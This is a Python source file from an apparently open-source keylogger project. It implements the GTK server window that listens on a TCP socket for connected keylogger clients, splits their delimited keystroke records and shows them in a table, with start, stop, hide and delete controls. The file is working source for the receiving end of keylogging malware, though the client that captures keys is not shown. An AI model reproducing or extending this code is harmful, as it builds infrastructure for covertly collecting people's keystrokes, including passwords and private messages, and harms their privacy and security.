#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
uiview.py

Ui view  will create a server window for key logger
"""

__author__ = "Sunil"
__copyright__ = "Copyleft 2015, keylogger Project"
__license__ = "GPL 3.0"
__version__ = "0.0.0"
__email__ = "sunhick@gmail.com"


import logging
import thread

from tcpsocket import TcpSocket
from gi.repository import Gtk
from gi.repository import Pango
from threading import current_thread


class ServerWindow:
    """
    Server UI window for key logger
    """    
    def __init__(self):
        self._log = logging.getLogger(__name__)
        self._log.debug('Gtk window init')

        self._builder = Gtk.Builder()
        self._builder.add_from_file('gui/main_ui.glade')
        self._builder.connect_signals(self)
        self._mainwindow = self._builder.get_object('server_window')

        self._read_config()
        self._set_window_size()
        self._set_icons()
        self._setup_keylog_view()
        self._server_sock = TcpSocket()


    # ---------------------- Internal methods ------------------------

    def _read_config(self):
        from ConfigParser import ConfigParser

        config = ConfigParser()
        config.read('defaults.cfg')
        self._delimiter = config.get('common', 'delimiter')
        count = config.getint('common', 'column_count')
        self._keylog_header = [config.get('common', 'column-' + str(i))
                         for i in range(1, count + 1)]
        self._log.debug('key log header = [{header}]'.format(header=self._keylog_header))
        del config

    def _callback(self, data):
        """ 
        GTK+ is not thread safe.

        _callback is called by the server socket handle client thread
        when data is available. GObject will dispatch the call to main thread.
        """
        self._log.info('Callback called from thread id: {threadid}'.format(
            threadid = current_thread()))
        if not data:
            self._log.debug('Data is empty, skipping')
            return

        # self._log.debug('Data at callback = [{d}]'.format(d=data))
        # Client contract: Will always send the data delimited by '|'
        keylog = data.split(self._delimiter)
        self._log.debug('Parsed value = [{parsed}]'.format(parsed=keylog))
        self._listmodel.append(keylog)

    def _setup_keylog_view(self):
        # the data in the model (three strings for each row, one for each
        # column)
        self._listmodel = Gtk.ListStore(str, str, str, str, str)

        # a treeview to see the data stored in the model
        self._view = Gtk.TreeView(model = self._listmodel)  # self._builder.get_object('keylog_view')
        self._view.connect('size-allocate', self.view_changed)
        
        # self._view.set_grid_lines(True)

        # for each column
        for i in range(len(self._keylog_header)):
            # cellrenderer to render the text
            cell = Gtk.CellRendererText()
            # the text in the first column should be in boldface
            if i == 0:
                cell.props.weight_set = True
                # the column is created
            col = Gtk.TreeViewColumn(self._keylog_header[i], cell, text=i)
            col.set_resizable(True)
            # and it is appended to the treeview
            self._view.append_column(col)

        self._scrolledwin = self._builder.get_object('scrolledwindow')
        self._scrolledwin.add(self._view)

    def _set_icons(self):
        self._set_resource(self._builder, 'refresh_img', 'images/refresh.png')
        self._set_resource(self._builder, 'delete_img', 'images/delete.png')
        self._set_resource(self._builder, 'info_img', 'images/info.png')
        self._set_resource(self._builder, 'hide_img', 'images/hide.png')
        self._set_resource(self._builder, 'about_img', 'images/about.png')
        self._set_resource(self._builder, 'stop_img', 'images/stop.png')
        self._set_resource(self._builder, 'start_img', 'images/start.png')

    def _set_resource(self, builder, objid, resource):
        uiobj = builder.get_object(objid)
        uiobj.set_from_file(resource)

    def _set_window_size(self):
        window = self.get_top_level_window()
        screen = window.get_screen()

        # collect data about each monitor
        monitors = []
        nmons = screen.get_n_monitors()
        self._log.info('There are %d monitors' % (nmons))
        
        for m in range(nmons):
            mg = screen.get_monitor_geometry(m)
            self._log.info('Monitor %d: %d x %d' % (m, mg.width, mg.height))
            monitors.append(mg)

        # current monitor
        curmon = screen.get_monitor_at_window(screen.get_active_window())
        width, height = monitors[curmon].width, monitors[curmon].height
        self._log.info('Monitor %d: %d x %d (current)' % (curmon, width, height))

        ww = 3*width/4
        wh = 3*height/4

        window.set_size_request(ww, wh)

    def _toggle_start_stop_button(self, start_enabled):
        startbtn = self._builder.get_object('start_button')
        stopbtn = self._builder.get_object('stop_button')
        startbtn.set_sensitive(start_enabled)
        stopbtn.set_sensitive(not start_enabled)

    # ------------------- Public methods ------------------------------
    
    def get_top_level_window(self):
        return self._mainwindow

    # -------------------- Signal handlers -----------------------------
    
    def on_app_exit(self, *args):
        self._log.info('Quitting key logger app')
        Gtk.main_quit(*args)

    def start_listening(self, widget):
        self._log.debug('Clicked on Stop button')
        self._log.info('Starting listening to the key logger clients')
        self._toggle_start_stop_button(False)
        thread.start_new_thread(self._server_sock.start, (self._callback,))

    def stop_listening(self, widget):
        self._log.debug('Clicked on Start button')
        self._log.info('Stop listening to the key logger clients')
        self._toggle_start_stop_button(True)
        thread.start_new_thread(self._server_sock.stop, ())

    def aboutus(self, widget):
        self._log.debug('Clicked on About us button')
        builder = Gtk.Builder()
        builder.add_from_file('gui/about.glade')
        about_dialog = builder.get_object('about_dialog')
        about_dialog.set_transient_for(self._mainwindow)
        builder.connect_signals(self)
        self._set_resource(builder, 'keylogger_img', 'images/keylogger-1.png')
        about_dialog.run()


    def information(self, widget):
        self._log.debug('Clicked on Information button')

    def hide(self, widget):
        self._log.debug('Clicked on hide button')
        self._view.set_child_visible(not self._view.get_child_visible())

    def delete_log(self, widget):
        self._log.debug('Clicked on delete logs button')
        self._listmodel.clear()

    def refresh(self, widget):
        self._log.debug('Clicked on refresh button')

    def on_about_ok(self, widget):
        self._log.debug('Clicked on about.Ok button')
        widget.destroy()

    def view_changed(self, widget, event, data=None):
        adj = self._scrolledwin.get_vadjustment()
        adj.set_value(adj.get_upper() - adj.get_page_size())
